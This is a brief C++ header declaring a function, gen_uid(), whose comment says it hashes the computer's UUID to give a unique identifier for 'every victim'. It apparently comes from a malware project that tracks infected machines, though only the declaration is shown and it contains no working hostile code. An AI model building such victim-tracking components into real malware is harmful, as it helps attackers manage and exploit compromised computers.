#pragma once

#include <string>


/// <summary>
/// This function is used to generate a unique identifier for every victim.
/// It retrieve the UUID of the computer and returns the hashed value of UUID.
/// </summary>
/// <returns></returns>
std::string gen_uid();
